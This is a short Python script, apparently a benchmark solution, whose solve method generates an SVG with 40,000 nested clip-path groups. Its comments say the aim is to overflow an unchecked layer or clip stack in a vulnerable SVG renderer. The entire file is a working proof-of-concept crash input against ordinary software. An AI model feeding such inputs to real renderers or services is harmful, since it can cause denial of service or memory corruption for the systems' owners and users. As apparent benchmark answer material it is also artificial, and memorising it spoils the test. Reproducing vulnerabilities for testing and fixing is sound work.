import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate an SVG with extremely deep nested clip groups to trigger unchecked clip mark nesting
        N = 40000  # depth; sufficiently large to overflow vulnerable layer/clip stack
        
        b = io.BytesIO()
        b.write(b'<?xml version="1.0" encoding="UTF-8"?>')
        b.write(b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">')
        b.write(b'<defs><clipPath id="c"><rect width="10" height="10"/></clipPath></defs>')
        open_tag = b'<g clip-path="url(#c)">'
        close_tag = b'</g>'
        # Open nested groups
        for _ in range(N):
            b.write(open_tag)
        # Minimal content
        b.write(b'<rect width="10" height="10"/>')
        # Close nested groups
        for _ in range(N):
            b.write(close_tag)
        b.write(b'</svg>')
        return b.getvalue()
